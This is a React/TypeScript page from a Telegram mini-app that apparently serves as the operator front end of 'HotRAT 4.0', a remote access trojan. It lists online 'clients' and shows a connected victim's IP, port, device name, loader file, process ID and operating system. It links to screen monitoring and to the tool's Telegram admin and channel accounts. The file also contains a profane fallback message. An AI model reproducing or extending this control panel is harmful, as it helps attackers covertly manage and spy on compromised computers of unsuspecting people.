import { Section, Cell, Image, List } from '@telegram-apps/telegram-ui';
import type { FC } from 'react';
import { useState, useEffect } from 'react';
//import { postEvent, on } from '@telegram-apps/sdk';

import { Link } from '@/components/Link/Link.tsx';
import { Page } from '@/components/Page.tsx';
import { initData } from '@telegram-apps/sdk-react';
import { Loading } from '@/components/Loading.tsx';
import { getAllClients ,getClient} from '@/api/ClientInfo';
import { updateToken, isConnect, SessionID, ConnectIp, ConnectPort } from '@/runtimes';
import { ClientInfo } from '@/api/ApiModels';

/*
  if (isConnect) {
    if (window.confirm("当前有连接没有断开，是否关闭应用？")) {
      postEvent("web_app_close", { return_back: false });
      disconnectSession(await GetToken(),SessionID);
    }
  } else {
    postEvent("web_app_close", { return_back: false });
  }
*/


export const IndexPage: FC = () => {
  const [loading, setLoading] = useState(() => {
    const hasVisited = localStorage.getItem('hasVisited');
    return !hasVisited;
  });

  const [clientsCount, setClientsCount] = useState<number | null>(null);
  const [userData, setUserData] = useState<any>(null);
  const [clientInfo, setClientInfo] = useState<ClientInfo>();

  var Token = updateToken();

  useEffect(() => {
    if (loading) {
      const timer = setTimeout(() => {
        setLoading(false);
        localStorage.setItem('hasVisited', 'true');
      }, 800);

      return () => clearTimeout(timer);
    }
  }, [loading]);

  useEffect(() => {

    const fetchUserData = async () => {
      const data = initData.state()?.user;
      console.log(Token);
      setUserData(data);
    };

    const fetchClientsCount = async () => {
      try {
        const response = await getAllClients(Token);
        if (response.code === 200) {
          setClientsCount(response.data.length); 
        } else {
          console.error('Failed to fetch clients:', response.data);
        }
      } catch (err) {
        console.error('Error fetching clients:', err);
      }
    };

    const fetchClientInfo = async () => {
      try {
        
        const clientData = await getClient(Token, ConnectIp,ConnectPort);

        setClientInfo(clientData.data);
      } catch (err) {
        console.error('Error fetching session info:', err);
      }
    };

    fetchUserData();
    fetchClientsCount();
    if(isConnect)
      fetchClientInfo();
  }, []);

  if (loading) {
    return <Loading />;
  }

  if (!userData) {
    return "我草泥马"; 
  }

  return (
    <Page back={false}>
      <List>
        <Section
          header="Welcome back HotRAT 4.0 App"
          footer="你可以使用 HotRAT-APP 体验与 HotRAT 4.0桌面版 相同的服务，但可以在任何平台控制您的设备."
        >
          <Link to="/user-data">
            <Cell
              before={<Image src={userData?.photoUrl} style={{ backgroundColor: '#007AFF', borderRadius: 30 }} />}
            >
              {userData?.firstName} {userData?.lastName}
            </Cell>
          </Link>

          <Link to="" onClick={()=>alert(`更新成功\n${updateToken()}`)}>
            <Cell>
              Token : {Token}
            </Cell>
          </Link>
          <Link to="/clients">
            <Cell>
              客户端列表 - 共 [{clientsCount !== null ? clientsCount : '...'}] 台在线
            </Cell>
          </Link>
        </Section>

        <Section header="已连接会话: ">
          {isConnect ? (
            <div>
              <Link to="/control">
                <Cell>
                  SessionID: {SessionID}
                </Cell>
              </Link>
              <Link to="/sc">
                <Cell>
                  屏幕监视
                </Cell>
              </Link>
              <Cell>
                IP: {ConnectIp}
              </Cell>
              <Cell>
                Port: {ConnectPort}
              </Cell>
              {clientInfo && (
                <div>
                  <Cell>
                    设备名: {clientInfo.userName}
                  </Cell>
                  <Cell>
                    加载器: {clientInfo.fileName}
                  </Cell>
                  <Cell>
                    进程ID: {clientInfo.processID}
                  </Cell>
                  <Cell>
                    操作系统: {clientInfo.systemVer}
                  </Cell>
                </div>
              )}
            </div>
          ) : (
            <Cell>
              没有连接到的会话.
            </Cell>
          )}
        </Section>

        <Section>
          <Link to="https://t.me/SmaZone">
            <Cell>@SmaZone  | 管理员</Cell>
          </Link>
          <Link to="https://t.me/NovaSGK">
            <Cell>@NovaSGK  | 群组</Cell>
          </Link>
          <Link to="https://t.me/hiNova888">
            <Cell>@HiNova888  | 频道</Cell>
          </Link>
        </Section>
      </List>
    </Page>
  );
};

export default IndexPage;

